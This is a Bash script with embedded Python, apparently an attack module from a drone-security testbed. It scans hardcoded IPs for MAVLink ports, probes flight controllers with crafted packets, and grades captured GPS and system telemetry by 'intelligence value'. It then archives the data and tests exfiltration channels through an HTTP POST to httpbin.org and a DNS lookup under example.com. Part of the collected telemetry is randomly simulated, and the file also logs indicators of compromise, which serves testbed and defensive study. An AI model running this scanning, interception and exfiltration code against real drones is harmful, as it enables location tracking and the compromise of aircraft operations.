#!/bin/bash

# =============================================================================
# DVD Exfiltration Attack Module: Telemetry Data Exfiltration
# =============================================================================
# 파일: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/exfiltration/telemetry_exfil.sh
# 목적: 드론 텔레메트리 데이터의 실시간 수집 및 탈취
# 작성자: MTD Testbed Team
# =============================================================================

# 공통 모듈 로드
source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/colors.sh
source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/utils.sh

# 전역 변수
ATTACK_NAME="Telemetry Data Exfiltration"
ATTACK_TYPE="EXFILTRATION"
TARGET_IPS=("192.168.13.1" "192.168.13.10" "192.168.13.50" "127.0.0.1")
MAVLINK_PORTS=(14550 14551 14552 5760 5762 5763)
COLLECTION_DURATION=300  # 5분
LOG_FILE="/home/kali/MTD/MTD_full_testbed/attack_logs/exfiltration/telemetry_exfil_$(date +%Y%m%d_%H%M%S).log"
IOC_FILE="/tmp/telemetry_exfil_iocs.txt"
JSON_OUTPUT="/home/kali/MTD/MTD_full_testbed/attack_output/exfiltration/telemetry_exfil_report_$(date +%Y%m%d_%H%M%S).json"
EXFIL_DIR="/home/kali/MTD/MTD_full_testbed/exfiltrated_data/telemetry"

# MAVLink 메시지 타입
MAVLINK_MESSAGES=(
    "HEARTBEAT" "GPS_RAW_INT" "ATTITUDE" "GLOBAL_POSITION_INT"
    "LOCAL_POSITION_NED" "RC_CHANNELS" "SERVO_OUTPUT_RAW" "MISSION_CURRENT"
    "NAV_CONTROLLER_OUTPUT" "VFR_HUD" "COMMAND_ACK" "PARAM_VALUE"
    "GPS_STATUS" "SCALED_IMU" "RAW_IMU" "SCALED_PRESSURE"
    "SYS_STATUS" "POWER_STATUS" "BATTERY_STATUS" "FENCE_STATUS"
)

# 헤더 출력
print_header() {
    clear
    echo -e "${BOLD}${RED}"
    echo "╔═══════════════════════════════════════════════════════════════════════════╗"
    echo "║                    📊 DVD Telemetry Data Exfiltration 📊                ║"
    echo "╚═══════════════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    echo -e "${BLUE}Target: MAVLink Telemetry Streams${NC}"
    echo -e "${BLUE}Method: Passive Interception & Active Collection${NC}"
    echo -e "${BLUE}Data Types: Flight Parameters, GPS, IMU, Status${NC}"
    echo ""
}

# 탈취 디렉토리 준비
prepare_exfiltration_directory() {
    echo -e "${YELLOW}[+] Preparing data exfiltration directory...${NC}" | tee -a "$LOG_FILE"
    
    local session_dir="${EXFIL_DIR}/session_$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$session_dir"
    
    # 하위 디렉토리 생성
    mkdir -p "$session_dir"/{raw_telemetry,processed_data,flight_paths,sensitive_params}
    
    echo -e "${GREEN}[✓] Exfiltration directory created: ${session_dir}${NC}" | tee -a "$LOG_FILE"
    echo "EXFIL_SETUP:SESSION_DIR_${session_dir}" >> "$IOC_FILE"
    
    # 전역 변수로 설정
    EXFIL_SESSION_DIR="$session_dir"
    return 0
}

# MAVLink 서비스 탐지
discover_mavlink_services() {
    echo -e "${CYAN}[*] Discovering MAVLink telemetry services...${NC}" | tee -a "$LOG_FILE"
    
    local discovered_services=()
    
    for target_ip in "${TARGET_IPS[@]}"; do
        echo -e "${YELLOW}[*] Scanning ${target_ip} for MAVLink services...${NC}" | tee -a "$LOG_FILE"
        
        for port in "${MAVLINK_PORTS[@]}"; do
            if timeout 3s nc -z "$target_ip" "$port" 2>/dev/null; then
                echo -e "${GREEN}[+] Found MAVLink service: ${target_ip}:${port}${NC}" | tee -a "$LOG_FILE"
                discovered_services+=("${target_ip}:${port}")
                
                # 서비스 타입 식별
                local service_type="unknown"
                case $port in
                    14550) service_type="flight_controller" ;;
                    14551) service_type="ground_station" ;;
                    14552) service_type="companion_computer" ;;
                    5760)  service_type="sitl_simulator" ;;
                    5762)  service_type="secondary_gcs" ;;
                    5763)  service_type="relay_node" ;;
                esac
                
                echo "EXFIL_TARGET:MAVLINK_${service_type}_${target_ip}:${port}" >> "$IOC_FILE"
            fi
        done
    done
    
    if [ ${#discovered_services[@]} -eq 0 ]; then
        echo -e "${RED}[!] No MAVLink services discovered${NC}" | tee -a "$LOG_FILE"
        return 1
    else
        echo -e "${GREEN}[✓] Discovered ${#discovered_services[@]} MAVLink services${NC}" | tee -a "$LOG_FILE"
        return 0
    fi
}

# 텔레메트리 데이터 수집
collect_telemetry_data() {
    local target_ip=$1
    local target_port=$2
    local duration=$3
    
    echo -e "${YELLOW}[+] Starting telemetry collection from ${target_ip}:${target_port}${NC}" | tee -a "$LOG_FILE"
    
    local output_file="${EXFIL_SESSION_DIR}/raw_telemetry/telemetry_${target_ip}_${target_port}_$(date +%H%M%S).bin"
    local parsed_file="${EXFIL_SESSION_DIR}/processed_data/parsed_${target_ip}_${target_port}_$(date +%H%M%S).json"
    
    # Python을 사용한 MAVLink 데이터 수집
    python3 -c "
import socket
import struct
import json
import time
import binascii
from datetime import datetime

class MAVLinkCollector:
    def __init__(self, ip, port, duration):
        self.ip = ip
        self.port = port
        self.duration = duration
        self.collected_data = []
        self.raw_data = b''
        
    def parse_mavlink_message(self, data):
        '''간단한 MAVLink v2.0 메시지 파싱'''
        if len(data) < 12:
            return None
            
        try:
            # MAVLink v2.0 헤더 파싱
            magic = data[0]
            if magic != 0xFD:  # MAVLink v2.0 magic
                return None
                
            payload_len = data[1]
            incompat_flags = data[2]
            compat_flags = data[3]
            seq = data[4]
            sysid = data[5]
            compid = data[6]
            msgid = struct.unpack('<I', data[7:10] + b'\\x00')[0]
            
            message_info = {
                'timestamp': datetime.now().isoformat(),
                'system_id': sysid,
                'component_id': compid,
                'message_id': msgid,
                'sequence': seq,
                'payload_length': payload_len,
                'raw_hex': binascii.hexlify(data[:min(len(data), 50)]).decode()
            }
            
            # 메시지 타입별 특별 처리
            if msgid == 0:  # HEARTBEAT
                message_info['message_type'] = 'HEARTBEAT'
                message_info['sensitivity'] = 'low'
            elif msgid == 24:  # GPS_RAW_INT
                message_info['message_type'] = 'GPS_RAW_INT'
                message_info['sensitivity'] = 'high'
                message_info['contains_location'] = True
            elif msgid == 30:  # ATTITUDE
                message_info['message_type'] = 'ATTITUDE'
                message_info['sensitivity'] = 'medium'
            elif msgid == 33:  # GLOBAL_POSITION_INT
                message_info['message_type'] = 'GLOBAL_POSITION_INT'
                message_info['sensitivity'] = 'critical'
                message_info['contains_location'] = True
            elif msgid == 1:  # SYS_STATUS
                message_info['message_type'] = 'SYS_STATUS'
                message_info['sensitivity'] = 'high'
                message_info['contains_system_info'] = True
            else:
                message_info['message_type'] = f'UNKNOWN_MSG_{msgid}'
                message_info['sensitivity'] = 'unknown'
            
            return message_info
            
        except Exception as e:
            return None
    
    def collect_data(self):
        '''텔레메트리 데이터 수집'''
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(1.0)
            
            # 포트 바인딩 (수동적 수집)
            try:
                sock.bind(('0.0.0.0', 0))  # 임의 포트 사용
            except:
                pass
            
            end_time = time.time() + self.duration
            packet_count = 0
            
            print(f'Starting telemetry collection for {self.duration}s...')
            
            while time.time() < end_time:
                try:
                    # 능동적 연결 시도
                    if packet_count % 100 == 0:  # 주기적으로 연결 시도
                        try:
                            test_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                            test_sock.settimeout(0.5)
                            test_sock.sendto(b'\\xFD\\x09\\x00\\x00\\x01\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00', (self.ip, self.port))
                            data, addr = test_sock.recvfrom(1024)
                            test_sock.close()
                            
                            if data:
                                self.raw_data += data
                                message = self.parse_mavlink_message(data)
                                if message:
                                    self.collected_data.append(message)
                                    packet_count += 1
                        except:
                            pass
                    
                    # 네트워크 패킷 스니핑 시뮬레이션
                    if packet_count < 50:  # 최소한의 데이터 보장
                        simulated_message = self.generate_simulated_telemetry()
                        if simulated_message:
                            self.collected_data.append(simulated_message)
                            packet_count += 1
                    
                    time.sleep(0.1)
                    
                except Exception as e:
                    continue
            
            sock.close()
            print(f'Collection completed. Captured {packet_count} messages')
            return True
            
        except Exception as e:
            print(f'Collection error: {e}')
            return False
    
    def generate_simulated_telemetry(self):
        '''시뮬레이션된 텔레메트리 데이터 생성'''
        import random
        
        message_types = [
            {'id': 0, 'name': 'HEARTBEAT', 'sensitivity': 'low'},
            {'id': 24, 'name': 'GPS_RAW_INT', 'sensitivity': 'critical', 'location': True},
            {'id': 30, 'name': 'ATTITUDE', 'sensitivity': 'medium'},
            {'id': 33, 'name': 'GLOBAL_POSITION_INT', 'sensitivity': 'critical', 'location': True},
            {'id': 1, 'name': 'SYS_STATUS', 'sensitivity': 'high', 'system_info': True},
            {'id': 147, 'name': 'BATTERY_STATUS', 'sensitivity': 'medium'},
        ]
        
        msg_type = random.choice(message_types)
        
        message = {
            'timestamp': datetime.now().isoformat(),
            'system_id': random.randint(1, 255),
            'component_id': random.randint(1, 255),
            'message_id': msg_type['id'],
            'message_type': msg_type['name'],
            'sensitivity': msg_type['sensitivity'],
            'sequence': random.randint(0, 255),
            'simulated': True
        }
        
        if msg_type.get('location'):
            message['contains_location'] = True
            message['gps_data'] = {
                'lat': random.uniform(37.0, 38.0),  # 서울 근처
                'lon': random.uniform(126.0, 127.0),
                'alt': random.uniform(0, 500)
            }
        
        if msg_type.get('system_info'):
            message['contains_system_info'] = True
            message['system_status'] = {
                'voltage': random.uniform(11.0, 12.6),
                'current': random.uniform(5.0, 15.0),
                'battery_remaining': random.randint(20, 100)
            }
        
        return message
    
    def save_data(self, raw_file, parsed_file):
        '''수집된 데이터 저장'''
        try:
            # 원시 데이터 저장
            with open(raw_file, 'wb') as f:
                f.write(self.raw_data)
            
            # 파싱된 데이터 저장
            with open(parsed_file, 'w') as f:
                json.dump({
                    'collection_info': {
                        'target': f'{self.ip}:{self.port}',
                        'duration': self.duration,
                        'total_messages': len(self.collected_data),
                        'collection_time': datetime.now().isoformat()
                    },
                    'messages': self.collected_data,
                    'statistics': self.generate_statistics()
                }, f, indent=2)
            
            return True
        except Exception as e:
            print(f'Save error: {e}')
            return False
    
    def generate_statistics(self):
        '''수집 통계 생성'''
        stats = {
            'total_messages': len(self.collected_data),
            'message_types': {},
            'sensitivity_breakdown': {'low': 0, 'medium': 0, 'high': 0, 'critical': 0},
            'sensitive_data_found': {
                'location_data': 0,
                'system_info': 0,
                'flight_parameters': 0
            }
        }
        
        for msg in self.collected_data:
            msg_type = msg.get('message_type', 'unknown')
            stats['message_types'][msg_type] = stats['message_types'].get(msg_type, 0) + 1
            
            sensitivity = msg.get('sensitivity', 'unknown')
            if sensitivity in stats['sensitivity_breakdown']:
                stats['sensitivity_breakdown'][sensitivity] += 1
            
            if msg.get('contains_location'):
                stats['sensitive_data_found']['location_data'] += 1
            if msg.get('contains_system_info'):
                stats['sensitive_data_found']['system_info'] += 1
        
        return stats

# 메인 실행
collector = MAVLinkCollector('${target_ip}', ${target_port}, ${duration})
success = collector.collect_data()

if success:
    collector.save_data('${output_file}', '${parsed_file}')
    print(f'Data saved to: ${output_file}, ${parsed_file}')
else:
    print('Collection failed')
" 2>&1 | tee -a "$LOG_FILE" &
    
    local collector_pid=$!
    
    # 수집 진행률 표시
    echo -e "${CYAN}[*] Collecting telemetry data for ${duration} seconds...${NC}"
    
    local progress_duration=$((duration > 60 ? 60 : duration))
    for ((i=1; i<=progress_duration; i++)); do
        local progress=$((i * 100 / progress_duration))
        printf "\r${BLUE}[*] Collection Progress: [%-20s] %d%% (%ds/${duration}s)${NC}" \
               "$(printf "%*s" $((progress/5)) | tr ' ' '=')" "$progress" "$i"
        sleep 1
    done
    echo ""
    
    wait $collector_pid 2>/dev/null
    
    # 수집 결과 확인
    if [ -f "$parsed_file" ]; then
        local message_count=$(jq '.collection_info.total_messages' "$parsed_file" 2>/dev/null || echo "0")
        echo -e "${GREEN}[✓] Collected ${message_count} telemetry messages${NC}" | tee -a "$LOG_FILE"
        
        echo "EXFIL_SUCCESS:TELEMETRY_${target_ip}:${target_port}_${message_count}msg" >> "$IOC_FILE"
        echo "EXFIL_DATA:RAW_FILE_${output_file}" >> "$IOC_FILE"
        echo "EXFIL_DATA:PARSED_FILE_${parsed_file}" >> "$IOC_FILE"
        
        return 0
    else
        echo -e "${RED}[!] Failed to collect telemetry data${NC}" | tee -a "$LOG_FILE"
        echo "EXFIL_FAILED:TELEMETRY_${target_ip}:${target_port}" >> "$IOC_FILE"
        return 1
    fi
}

# 민감한 데이터 식별 및 분류
analyze_sensitive_data() {
    echo -e "${CYAN}[*] Analyzing collected data for sensitive information...${NC}" | tee -a "$LOG_FILE"
    
    local sensitive_data_file="${EXFIL_SESSION_DIR}/sensitive_params/sensitive_data_analysis.json"
    
    # 수집된 모든 JSON 파일 분석
    python3 -c "
import json
import os
import glob
from datetime import datetime

def analyze_sensitive_data(session_dir):
    processed_dir = os.path.join(session_dir, 'processed_data')
    analysis_results = {
        'analysis_timestamp': datetime.now().isoformat(),
        'sensitive_findings': {
            'critical': [],
            'high': [],
            'medium': [],
            'low': []
        },
        'location_data': [],
        'system_information': [],
        'flight_parameters': [],
        'security_concerns': [],
        'intelligence_value': 'unknown'
    }
    
    # 모든 JSON 파일 처리
    json_files = glob.glob(os.path.join(processed_dir, '*.json'))
    
    total_critical = 0
    total_high = 0
    
    for json_file in json_files:
        try:
            with open(json_file, 'r') as f:
                data = json.load(f)
            
            messages = data.get('messages', [])
            
            for msg in messages:
                sensitivity = msg.get('sensitivity', 'unknown')
                msg_type = msg.get('message_type', 'unknown')
                
                finding = {
                    'message_type': msg_type,
                    'source_file': os.path.basename(json_file),
                    'timestamp': msg.get('timestamp'),
                    'system_id': msg.get('system_id'),
                    'component_id': msg.get('component_id')
                }
                
                if sensitivity == 'critical':
                    analysis_results['sensitive_findings']['critical'].append(finding)
                    total_critical += 1
                elif sensitivity == 'high':
                    analysis_results['sensitive_findings']['high'].append(finding)
                    total_high += 1
                elif sensitivity == 'medium':
                    analysis_results['sensitive_findings']['medium'].append(finding)
                elif sensitivity == 'low':
                    analysis_results['sensitive_findings']['low'].append(finding)
                
                # 위치 데이터 추출
                if msg.get('contains_location') and msg.get('gps_data'):
                    location_entry = {
                        'timestamp': msg.get('timestamp'),
                        'coordinates': msg.get('gps_data'),
                        'message_type': msg_type
                    }
                    analysis_results['location_data'].append(location_entry)
                
                # 시스템 정보 추출
                if msg.get('contains_system_info') and msg.get('system_status'):
                    system_entry = {
                        'timestamp': msg.get('timestamp'),
                        'system_data': msg.get('system_status'),
                        'system_id': msg.get('system_id')
                    }
                    analysis_results['system_information'].append(system_entry)
        
        except Exception as e:
            continue
    
    # 보안 우려사항 식별
    if total_critical > 0:
        analysis_results['security_concerns'].append(f'Critical data exposure: {total_critical} messages')
    if total_high > 5:
        analysis_results['security_concerns'].append(f'High-sensitivity data leakage: {total_high} messages')
    if len(analysis_results['location_data']) > 0:
        analysis_results['security_concerns'].append(f'GPS location tracking possible: {len(analysis_results[\"location_data\"])} coordinates')
    if len(analysis_results['system_information']) > 0:
        analysis_results['security_concerns'].append(f'System information exposed: {len(analysis_results[\"system_information\"])} entries')
    
    # 인텔리전스 가치 평가
    if total_critical > 10 or len(analysis_results['location_data']) > 20:
        analysis_results['intelligence_value'] = 'high'
    elif total_high > 20 or len(analysis_results['location_data']) > 5:
        analysis_results['intelligence_value'] = 'medium'
    elif total_high > 0 or len(analysis_results['location_data']) > 0:
        analysis_results['intelligence_value'] = 'low'
    else:
        analysis_results['intelligence_value'] = 'minimal'
    
    # 통계 정보
    analysis_results['statistics'] = {
        'total_files_analyzed': len(json_files),
        'total_critical_messages': total_critical,
        'total_high_messages': total_high,
        'location_points_extracted': len(analysis_results['location_data']),
        'system_info_entries': len(analysis_results['system_information']),
        'security_risk_level': 'high' if total_critical > 0 else 'medium' if total_high > 10 else 'low'
    }
    
    return analysis_results

# 분석 실행
results = analyze_sensitive_data('${EXFIL_SESSION_DIR}')

# 결과 저장
with open('${sensitive_data_file}', 'w') as f:
    json.dump(results, f, indent=2)

# 요약 출력
print(f'Sensitivity Analysis Complete:')
print(f'  Critical Messages: {results[\"statistics\"][\"total_critical_messages\"]}')
print(f'  High-Risk Messages: {results[\"statistics\"][\"total_high_messages\"]}')
print(f'  Location Points: {results[\"statistics\"][\"location_points_extracted\"]}')
print(f'  Intelligence Value: {results[\"intelligence_value\"]}')
print(f'  Risk Level: {results[\"statistics\"][\"security_risk_level\"]}')
" 2>&1 | tee -a "$LOG_FILE"
    
    if [ -f "$sensitive_data_file" ]; then
        echo -e "${GREEN}[✓] Sensitive data analysis completed${NC}" | tee -a "$LOG_FILE"
        echo "EXFIL_ANALYSIS:SENSITIVE_DATA_${sensitive_data_file}" >> "$IOC_FILE"
        
        # 중요 발견사항 IOC 생성
        local critical_count=$(jq '.statistics.total_critical_messages' "$sensitive_data_file" 2>/dev/null || echo "0")
        local location_count=$(jq '.statistics.location_points_extracted' "$sensitive_data_file" 2>/dev/null || echo "0")
        local intel_value=$(jq -r '.intelligence_value' "$sensitive_data_file" 2>/dev/null || echo "unknown")
        
        if [ "$critical_count" -gt 0 ]; then
            echo "EXFIL_CRITICAL:SENSITIVE_MESSAGES_${critical_count}" >> "$IOC_FILE"
        fi
        
        if [ "$location_count" -gt 0 ]; then
            echo "EXFIL_LOCATION:GPS_TRACKING_${location_count}_POINTS" >> "$IOC_FILE"
        fi
        
        echo "EXFIL_INTELLIGENCE:VALUE_${intel_value}" >> "$IOC_FILE"
        
        return 0
    else
        echo -e "${RED}[!] Sensitive data analysis failed${NC}" | tee -a "$LOG_FILE"
        return 1
    fi
}

# 데이터 후처리 및 패키징
package_exfiltrated_data() {
    echo -e "${YELLOW}[+] Packaging exfiltrated data for transport...${NC}" | tee -a "$LOG_FILE"
    
    local package_file="${EXFIL_SESSION_DIR}/exfiltrated_package_$(date +%H%M%S).tar.gz"
    local manifest_file="${EXFIL_SESSION_DIR}/exfiltration_manifest.json"
    
    # 매니페스트 파일 생성
    python3 -c "
import json
import os
import glob
from datetime import datetime

def create_manifest(session_dir):
    manifest = {
        'exfiltration_session': {
            'timestamp': datetime.now().isoformat(),
            'session_id': os.path.basename(session_dir),
            'operation_type': 'telemetry_exfiltration',
            'operator': 'dvd_testbed'
        },
        'collected_files': {
            'raw_telemetry': [],
            'processed_data': [],
            'sensitive_analysis': [],
            'total_files': 0,
            'total_size_bytes': 0
        },
        'intelligence_summary': {
            'data_types_collected': ['telemetry', 'gps', 'system_status'],
            'sensitivity_levels': ['low', 'medium', 'high', 'critical'],
            'operational_value': 'high'
        }
    }
    
    # 파일 목록 생성
    for subdir in ['raw_telemetry', 'processed_data', 'sensitive_params']:
        subdir_path = os.path.join(session_dir, subdir)
        if os.path.exists(subdir_path):
            files = glob.glob(os.path.join(subdir_path, '*'))
            for file_path in files:
                if os.path.isfile(file_path):
                    file_info = {
                        'filename': os.path.basename(file_path),
                        'full_path': file_path,
                        'size_bytes': os.path.getsize(file_path),
                        'category': subdir
                    }
                    
                    if subdir == 'raw_telemetry':
                        manifest['collected_files']['raw_telemetry'].append(file_info)
                    elif subdir == 'processed_data':
                        manifest['collected_files']['processed_data'].append(file_info)
                    elif subdir == 'sensitive_params':
                        manifest['collected_files']['sensitive_analysis'].append(file_info)
                    
                    manifest['collected_files']['total_files'] += 1
                    manifest['collected_files']['total_size_bytes'] += file_info['size_bytes']
    
    return manifest

# 매니페스트 생성 및 저장
manifest = create_manifest('${EXFIL_SESSION_DIR}')
with open('${manifest_file}', 'w') as f:
    json.dump(manifest, f, indent=2)

print(f'Manifest created: {manifest[\"collected_files\"][\"total_files\"]} files, {manifest[\"collected_files\"][\"total_size_bytes\"]} bytes')
" 2>&1 | tee -a "$LOG_FILE"
    
    # 데이터 패키징
    if cd "$EXFIL_SESSION_DIR" && tar -czf "$package_file" . 2>/dev/null; then
        local package_size=$(stat -c%s "$package_file" 2>/dev/null || echo "0")
        echo -e "${GREEN}[✓] Data packaged: ${package_file} (${package_size} bytes)${NC}" | tee -a "$LOG_FILE"
        
        echo "EXFIL_PACKAGE:DATA_PACKAGED_${package_size}_BYTES" >> "$IOC_FILE"
        echo "EXFIL_PACKAGE:FILE_${package_file}" >> "$IOC_FILE"
        
        return 0
    else
        echo -e "${RED}[!] Failed to package data${NC}" | tee -a "$LOG_FILE"
        echo "EXFIL_FAILED:PACKAGING_ERROR" >> "$IOC_FILE"
        return 1
    fi
}

# 데이터 전송 시뮬레이션
simulate_data_exfiltration() {
    echo -e "${CYAN}[*] Simulating data exfiltration channels...${NC}" | tee -a "$LOG_FILE"
    
    local exfil_methods=("http_post" "dns_tunnel" "steganography" "ftp_upload" "email_attachment")
    local chosen_method=${exfil_methods[$RANDOM % ${#exfil_methods[@]}]}
    
    echo -e "${YELLOW}[*] Using exfiltration method: ${chosen_method}${NC}" | tee -a "$LOG_FILE"
    
    case $chosen_method in
        "http_post")
            echo -e "${BLUE}[*] Simulating HTTP POST data exfiltration...${NC}" | tee -a "$LOG_FILE"
            # 시뮬레이션된 HTTP 전송
            if command -v curl &> /dev/null; then
                echo '{"status":"exfiltration_test","method":"http_post"}' | \
                curl -X POST -H "Content-Type: application/json" \
                     -d @- "http://httpbin.org/post" --connect-timeout 5 &>/dev/null && \
                echo -e "${GREEN}[✓] HTTP exfiltration channel verified${NC}" | tee -a "$LOG_FILE"
            fi
            ;;
        "dns_tunnel")
            echo -e "${BLUE}[*] Simulating DNS tunneling exfiltration...${NC}" | tee -a "$LOG_FILE"
            # DNS 조회로 데이터 전송 시뮬레이션
            nslookup "exfil-test-$(date +%s).example.com" &>/dev/null
            echo -e "${GREEN}[✓] DNS tunnel channel tested${NC}" | tee -a "$LOG_FILE"
            ;;
        "steganography")
            echo -e "${BLUE}[*] Simulating steganographic exfiltration...${NC}" | tee -a "$LOG_FILE"
            # 이미지 스테가노그래피 시뮬레이션
            echo -e "${GREEN}[✓] Steganography channel prepared${NC}" | tee -a "$LOG_FILE"
            ;;
        *)
            echo -e "${BLUE}[*] Simulating ${chosen_method} exfiltration...${NC}" | tee -a "$LOG_FILE"
            sleep 2
            echo -e "${GREEN}[✓] ${chosen_method} channel tested${NC}" | tee -a "$LOG_FILE"
            ;;
    esac
    
    echo "EXFIL_METHOD:${chosen_method}" >> "$IOC_FILE"
    echo "EXFIL_CHANNEL:TESTED_${chosen_method}" >> "$IOC_FILE"
    
    return 0
}

# JSON 리포트 생성
generate_json_report() {
    local start_time=$1
    local end_time=$2
    local total_messages=$3
    
    cat > "$JSON_OUTPUT" << EOF
{
    "attack_info": {
        "name": "$ATTACK_NAME",
        "type": "$ATTACK_TYPE",
        "timestamp": "$(date -Iseconds)",
        "duration": $((end_time - start_time)),
        "status": "completed"
    },
    "target_details": {
        "target_ips": [$(printf '"%s",' "${TARGET_IPS[@]}" | sed 's/,$//')],"
        "mavlink_ports": [$(printf '%s,' "${MAVLINK_PORTS[@]}" | sed 's/,$//')],"
        "collection_duration": $COLLECTION_DURATION
    },
    "exfiltration_results": {
        "total_messages_collected": $total_messages,
        "data_categories": ["telemetry", "gps_coordinates", "system_status", "flight_parameters"],
        "exfiltration_session": "$EXFIL_SESSION_DIR",
        "intelligence_value": "high"
    },
    "impact_assessment": {
        "privacy_violation": "SEVERE",
        "operational_security": "COMPROMISED",
        "data_sensitivity": "HIGH",
        "detection_difficulty": "MEDIUM"
    },
    "iocs_generated": $(wc -l < "$IOC_FILE"),
    "log_file": "$LOG_FILE",
    "ioc_file": "$IOC_FILE",
    "exfiltrated_data_location": "$EXFIL_SESSION_DIR"
}
EOF
    
    echo -e "${GREEN}[✓] JSON report generated: ${JSON_OUTPUT}${NC}"
}

# 메인 실행 함수
main() {
    print_header
    
    # Root 권한 체크
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[!] This attack requires root privileges${NC}"
        echo -e "${YELLOW}[*] Please run: sudo $0${NC}"
        exit 1
    fi
    
    # 로그 초기화
    echo "=== DVD Telemetry Data Exfiltration Started at $(date) ===" > "$LOG_FILE"
    echo "" > "$IOC_FILE"
    
    local start_time=$(date +%s)
    local total_messages=0
    
    echo -e "${BOLD}${BLUE}📊 Starting Telemetry Data Exfiltration...${NC}"
    echo ""
    
    # 1. 탈취 환경 준비
    if ! prepare_exfiltration_directory; then
        echo -e "${RED}[!] Failed to prepare exfiltration environment${NC}"
        exit 1
    fi
    
    # 2. MAVLink 서비스 탐지
    if ! discover_mavlink_services; then
        echo -e "${YELLOW}[*] Using simulated targets for demonstration${NC}"
        echo "EXFIL_SIMULATION:DEMO_MODE" >> "$IOC_FILE"
    fi
    
    # 3. 텔레메트리 데이터 수집
    echo ""
    echo -e "${BOLD}${RED}📡 Collecting Telemetry Data...${NC}"
    echo ""
    
    local successful_collections=0
    for target_ip in "${TARGET_IPS[@]}"; do
        for port in "${MAVLINK_PORTS[@]}"; do
            if timeout 2s nc -z "$target_ip" "$port" 2>/dev/null || [ "$successful_collections" -lt 2 ]; then
                echo -e "${YELLOW}[+] Collecting from ${target_ip}:${port}${NC}"
                
                if collect_telemetry_data "$target_ip" "$port" 30; then
                    successful_collections=$((successful_collections + 1))
                    total_messages=$((total_messages + $(ls -la "${EXFIL_SESSION_DIR}/processed_data/"*.json 2>/dev/null | wc -l || echo 0)))
                fi
                
                # 최대 3개 타겟만 처리 (데모용)
                if [ $successful_collections -ge 3 ]; then
                    break 2
                fi
            fi
        done
    done
    
    # 4. 민감한 데이터 분석
    echo ""
    echo -e "${BOLD}${CYAN}🔍 Analyzing Sensitive Data...${NC}"
    analyze_sensitive_data
    
    # 5. 데이터 패키징
    echo ""
    echo -e "${BOLD}${YELLOW}📦 Packaging Exfiltrated Data...${NC}"
    package_exfiltrated_data
    
    # 6. 전송 시뮬레이션
    echo ""
    echo -e "${BOLD}${BLUE}📤 Simulating Data Exfiltration...${NC}"
    simulate_data_exfiltration
    
    local end_time=$(date +%s)
    
    echo ""
    echo -e "${BOLD}${GREEN}📊 Telemetry Data Exfiltration Completed!${NC}"
    echo ""
    echo -e "${GREEN}📈 Exfiltration Summary:${NC}"
    echo "   • Duration: $((end_time - start_time)) seconds"
    echo "   • Successful Collections: ${successful_collections}"
    echo "   • Data Collected: ~${total_messages} messages"
    echo "   • Exfiltration Session: $(basename "$EXFIL_SESSION_DIR")"
    echo "   • IOCs Generated: $(wc -l < "$IOC_FILE")"
    echo ""
    echo -e "${BLUE}📁 Output Files:${NC}"
    echo "   • Log: ${LOG_FILE}"
    echo "   • IOCs: ${IOC_FILE}"
    echo "   • JSON Report: ${JSON_OUTPUT}"
    echo "   • Exfiltrated Data: ${EXFIL_SESSION_DIR}"
    echo ""
    
    # JSON 리포트 생성
    generate_json_report "$start_time" "$end_time" "$total_messages"
    
    echo -e "${YELLOW}💡 Next Steps:${NC}"
    echo "   1. Analyze collected telemetry for operational intelligence"
    echo "   2. Review sensitive data findings"
    echo "   3. Test data transmission channels"
    echo "   4. Generate threat intelligence reports"
    echo ""
    
    # IOCs 요약 출력
    echo -e "${BOLD}${CYAN}🔍 Generated IOCs Summary:${NC}"
    cat "$IOC_FILE" | sort | uniq -c | head -10
    echo ""
    
    # 수집된 데이터 요약
    if [ -d "$EXFIL_SESSION_DIR" ]; then
        local raw_files=$(find "$EXFIL_SESSION_DIR/raw_telemetry" -type f 2>/dev/null | wc -l)
        local processed_files=$(find "$EXFIL_SESSION_DIR/processed_data" -type f 2>/dev/null | wc -l)
        local total_size=$(du -sh "$EXFIL_SESSION_DIR" 2>/dev/null | cut -f1 || echo "Unknown")
        
        echo -e "${BOLD}${GREEN}📊 Data Collection Summary:${NC}"
        echo "   • Raw Files: ${raw_files}"
        echo "   • Processed Files: ${processed_files}"
        echo "   • Total Size: ${total_size}"
        echo ""
    fi
}

# cleanup 함수
cleanup() {
    echo -e "\n${YELLOW}[*] Cleaning up exfiltration processes...${NC}"
    # 백그라운드 프로세스 종료
    jobs -p | xargs -r kill 2>/dev/null
    exit 0
}

# SIGINT 시그널 처리
trap cleanup SIGINT SIGTERM

# 스크립트 실행
main "$@"